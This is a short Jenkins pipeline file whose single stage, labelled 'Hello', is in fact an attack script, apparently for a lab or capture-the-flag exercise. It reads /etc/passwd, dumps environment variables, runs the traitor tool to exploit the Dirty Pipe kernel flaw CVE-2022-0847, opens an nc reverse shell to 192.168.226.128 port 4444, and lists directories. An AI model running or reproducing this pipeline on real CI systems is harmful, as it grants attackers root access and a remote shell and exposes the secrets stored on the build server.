pipeline {
    agent any

    stages {
        stage('Hello') {
            steps {
                sh 'cat /etc/passwd'
                sh 'env'
                sh 'chmod 777 traitor-amd64'
                sh './traitor-amd64 --exploit kernel:CVE-2022-0847'
                sh 'id'
                sh 'whoami'
                sh 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.226.128 4444 >/tmp/f'
                sh 'ls -a'
                sh 'ls -la /'
                sh 'ls -la /var/'
            }
        }
    }
}
